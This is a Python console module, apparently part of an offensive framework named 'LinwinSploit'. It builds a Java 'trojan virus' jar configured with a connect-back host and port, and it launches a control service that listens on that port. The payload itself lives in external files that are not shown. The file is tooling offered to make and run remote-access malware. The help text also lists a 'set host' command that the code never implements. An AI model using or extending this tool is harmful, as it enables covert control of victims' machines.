import main
import os

class options():
    port: int = 8888
    connect: str = ""
    name: str = "app"

op = options()

def show_options():
    print()
    print(" ++++")
    print(" | host: " + op.connect)
    print(" | port: " + str(op.port))
    print(" | Package Name: "+op.name)
    print(" | Payload Name: program/java/trojan_virus")
    print(" ++++")
    print()

def console(runpath: str, jre: str):
    print("Enter 'help' to get help.")
    print("Enter 'make' to make a new trojan virus file.")
    print("Enter 'exit' to exit")
    print()

    while True:
        command = input("LinwinSploit - [program/python/trojan_virus] > ").strip()

        if command == 'help':
            print("""
 1. make                Make a new trojan virus file (.jar).
 2. set port [local port]       Set connect port.
 3. set host [connect host]     Set connect host
 4. set name [package name]     Set package name of the jar file.
 3. run                         Run the Trojan virus Service.
 4. show options                Show all the options you must input
            """)
            continue

        if command == 'make':
            #os.system("cp "+runpath+"/../Module/program/java/trojan_virus/release/app.jar")
            os.system(jre+" -jar "+runpath+"/../Module/program/java/trojan_virus/release/make.jar "+op.name+" "+op.connect+" "+str(op.port))
            print(" [INFO] Make Java Trojan Virus OK: "+os.environ['HOME']+"/"+op.name+".jar")

        if command.startswith("set port "):
            try :
                port: int = int(command[9:len(command)])
                op.port = port

            except:
                print("input error")
                continue

        if command == 'show options':
            show_options()

        if command == 'run':
            os.system("python3 "+runpath+"/../Module/program/python/trojan_virus/control.py "+str(op.port))
            continue
            
        if command == 'exit':
            main.main()